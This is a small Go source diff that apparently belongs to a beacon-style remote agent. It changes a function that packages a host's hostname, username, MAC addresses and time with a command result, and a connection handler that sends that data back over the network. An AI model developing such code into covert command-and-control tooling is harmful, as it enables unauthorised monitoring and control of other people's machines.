@@ -92,7 +92,7 @@ func writeData(Beacon bool, result string) string {
 		Hostname: getHostname(),
 		Username: userN,
 		Time:     time.Now().UTC().Format("2006-01-02 15:04:05"),
-		Result:   "{FROM FUNC}",
+		Result:   result,
 		Mac:      arrToString(macA),
 	}
 
@@ -124,8 +124,9 @@ func handleConnection(conn net.Conn) {
 		conn.Close()
 		return
 	}
-	print(string(command))
-	conn.Write([]byte(writeData()))
+	//THIS IS THE NON BEACON WRITE
+	//print(string(command))
+	conn.Write([]byte(writeData(false, string(command))))
 }
 
 func main() {
